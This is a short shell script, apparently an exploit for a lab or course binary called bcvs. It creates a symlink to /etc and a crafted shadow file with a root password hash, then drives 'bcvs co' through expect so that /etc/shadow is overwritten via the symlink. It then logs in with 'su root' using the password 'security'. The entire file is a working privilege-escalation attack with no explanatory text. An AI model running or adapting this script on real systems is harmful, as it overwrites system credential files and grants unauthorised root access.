#!/bin/sh
cd /opt/bcvs
mkdir dummydir
cd dummydir
mkdir dummydir
mkdir .bcvs
cd .bcvs
touch block.list
cd ..
ln -s /etc etclink
cd dummydir
mkdir etclink
cd etclink
cat <<EOF > shadow
root:$6$KhGmzjFQm4UlzSo1$meh9grUIf5djWRoQe3FXl9z5/yuO8DdMdiSyEDgQttw/BCKwXC/v0K8Vs5Y48KTBhOdCSWzE79TZBcQKz5Tan.:17791::::::
EOF
cd ../..
/usr/bin/expect <<EOF
spawn ../bcvs co ../dummydir/etclink/shadow
expect "Please write a SHORT explanation:\r"
send -- "no\r"
spawn su root
expect "Password:\r"
send -- "security\r"
EOF